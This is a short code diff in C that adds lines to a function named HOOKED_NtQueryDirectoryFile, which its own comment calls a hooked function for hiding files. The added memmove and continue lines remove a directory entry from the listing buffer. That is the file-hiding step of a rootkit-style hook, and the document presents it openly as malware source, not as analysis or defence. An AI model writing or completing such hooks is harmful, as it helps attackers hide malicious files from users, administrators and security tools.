@@ -117,6 +117,8 @@ NTSTATUS NTAPI HOOKED_NtQueryDirectoryFile( //Hooked function for hiding files a
                     }
                 } else {
                     //memmove again, check on ipad how
+		    memmove(dirinfo, (PBYTE)dirinfo + dirinfo->NextEntryOffset, Length - ((PBYTE)dirinfo - (PBYTE)FileInformtation) - dirinfo->NextEntryOffset);
+		    continue;
                     
                 }
             } else {
